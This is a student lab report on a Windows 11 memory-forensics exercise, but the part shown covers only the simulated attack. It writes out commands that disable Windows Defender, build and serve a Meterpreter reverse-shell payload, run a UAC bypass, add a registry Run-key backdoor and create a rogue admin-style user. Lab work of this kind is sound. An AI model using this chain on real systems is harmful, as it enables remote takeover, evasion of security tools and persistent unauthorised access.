#  Memory Forensics Analysis on Windows 11

##  Details

* Name: Jadhav Sai
* Roll No: 2023BCY0064

---

##  Objective

To simulate a real-world cyber attack using Metasploit and perform memory forensic analysis to detect malicious activity.

---

##  Lab Environment

###  Attacker System (Kali Linux)

* IP Address: 192.168.54.10
* Network: NAT

![Kali Setup](../screenshots/lab_kali_setup.png)

---

###  Target System (Windows 11)

* IP Address: 192.168.54.9
* Network: NAT

![Windows Setup](../screenshots/lab_windows_setup.png)

---

##  Network Connectivity

### Kali → Windows

![Kali to Windows Ping](../screenshots/network_kali_to_windows.png)

### Windows → Kali

![Windows to Kali Ping](../screenshots/network_windows_to_kali.png)

Both systems are successfully communicating.

---

## Security Configuration

### Disable Windows Defender

![PowerShell Admin](../screenshots/defender_powershell.png)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
```

![Defender Disabled](../screenshots/defender_disable.png)

Verification:

```powershell
Get-MpPreference | Select DisableRealtimeMonitoring
```

![Defender Verify](../screenshots/defender_verify.png)

---

##  Tools Used

* Metasploit
* Volatility
* FTK Imager

![Tools](../screenshots/tools_used.png)

---

##  Methodology

Payload Creation → Exploitation → Memory Acquisition → Analysis → Evidence Correlation

---

##  Attack Execution

###  Reverse Shell Creation

Payload Generation:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.54.10 LPORT=4444 -f exe -o testdf.exe
```

![Payload Creation](../screenshots/payload_creation.png)

---

###  Listener Setup

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.54.10
set LPORT 4444
exploit
```

![Listener Setup](../screenshots/listener_setup.png)

---

###  Payload Delivery

```bash
python3 -m http.server
```

![HTTP Server](../screenshots/http_server.png)

---

###  Payload Execution

User downloads:

```
http://192.168.54.10:8000/testdf.exe
```

![Payload Download](../screenshots/payload_download.png)

---

###  Reverse Shell Established

![Reverse Shell](../screenshots/reverse_shell.png)

 Attacker gained remote access

---

##  Privilege Escalation

```bash
use exploit/windows/local/bypassuac_fodhelper
```

![UAC Bypass](../screenshots/uac_bypass.png)

 Elevated privileges obtained

---

## Persistence Mechanism

```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\Users\jadhav\Desktop\registry.exe" /f
```

![Persistence](../screenshots/persistence_registry.png)

 Persistence established

---

##  User Creation

```bash
net user attacker_user Pass@123 /add
```

![User Created](../screenshots/user_created.png)

 Attacker now has full system control

---

##  Summary

* Reverse shell established
* Privilege escalation successful
* Persistence created
* Attacker user added

System fully compromised
